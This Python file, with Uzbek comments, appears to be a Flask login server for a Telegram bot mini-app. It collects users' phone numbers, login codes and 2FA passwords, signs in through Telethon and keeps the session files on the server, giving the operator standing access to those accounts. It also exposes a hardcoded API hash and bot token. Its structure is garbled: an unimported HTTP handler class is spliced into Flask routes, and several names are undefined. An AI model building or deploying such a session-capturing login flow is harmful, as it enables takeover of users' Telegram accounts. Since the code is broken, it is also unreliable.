import json
import psycopg2
import os
import asyncio
from aiogram import Bot
from telethon.sync import TelegramClient
from flask import Flask
from flask import Flask, render_template, request, jsonify

app = Flask(__name__, template_folder="templates")

from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError)

DATABASE_URL = os.getenv("DATABASE_URL")

def get_db():
    return psycopg2.connect(DATABASE_URL)

API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"
BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"
bot = Bot(BOT_TOKEN)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)
BOT_NOTIFY_URL = "https://telegram-bots-production-af1b.up.railway.app/miniapp"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
AUTHORIZED_FILE = os.path.join(BASE_DIR, "authorized_users.json")

# phone -> {client, phone_code_hash}
pending = {}

def session_path(phone):
    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))

class LoginHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path in ["/", "/login.html"]:
            with open("login.html", "rb") as f:
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())
            return
        self.send_error(404)

    def do_POST(self):
        # 1️⃣ JSONni xavfsiz o‘qiymiz
        try:
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length)

            if not raw:
                return self.respond({"status": "empty_body"})

            data = json.loads(raw)
        except Exception as e:
            print("POST PARSE ERROR:", e)
            return self.respond({"status": "bad_request"})

        action = data.get("action")
        phone = data.get("phone")
        code = data.get("code")
        password = data.get("password")

        # ===== SEND CODE =====
@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")

    try:
        client = TelegramClient(session_path(phone), API_ID, API_HASH)
        client.connect()

        sent = client.send_code_request(phone)
        pending[phone] = {
            "client": client,
            "hash": sent.phone_code_hash
        }

        return jsonify({"ok": True})

    except PhoneNumberInvalidError:
        return jsonify({"ok": False, "error": "phone_invalid"})


                        # ===== VERIFY CODE =====
@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")

    if phone not in pending:
        return jsonify({"ok": False})

    client = pending[phone]["client"]
    phone_hash = pending[phone]["hash"]

    try:
        client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
        me = client.get_me()

        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO authorized_users (user_id, phone)
            VALUES (%s, %s)
            ON CONFLICT (user_id) DO UPDATE SET phone = EXCLUDED.phone
        """, (str(me.id), phone))
        conn.commit()
        conn.close()

        client.disconnect()
        pending.pop(phone)

        return jsonify({"ok": True, "user_id": me.id})

    except PhoneCodeInvalidError:
        return jsonify({"ok": False, "error": "invalid_code"})



        # ===== VERIFY PASSWORD (2FA) =====
        if action == "verify_password":
            if phone not in pending:
                return self.respond({"status": "no_session"})

            client = pending[phone]["client"]

            try:
                client.sign_in(password=password)
            except Exception:
                return self.respond({"status": "invalid_password"})

            # 🔥 ENG MUHIM JOY
            me = client.get_me()
            user_id = me.id

            
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO authorized_users (user_id, phone)
                VALUES (%s, %s)
                ON CONFLICT (user_id) DO UPDATE SET phone = EXCLUDED.phone
            """, (str(user_id), phone))

            conn.commit()
            conn.close()


            client.disconnect()
            pending.pop(phone)

            return self.respond({"status": "success"})


    def respond(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def notify_bot_sync(user_id):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    loop.run_until_complete(
        bot.send_message(
            int(user_id),
            "✅ Siz muvaffaqiyatli tizimga kirdingiz!\n\n"
            "👇 Endi botdan to‘liq foydalanishingiz mumkin:",
            reply_markup=main_menu()
        )
    )

    loop.close()

@app.route("/")
def index():
    return "OK, LOGIN SERVER ISHLAYAPTI"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

# (keyinchalik auth uchun)
@app.route("/auth", methods=["POST"])
def auth():
    data = request.json
    return jsonify({"ok": True})

# =========================
# RUN
# =========================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)













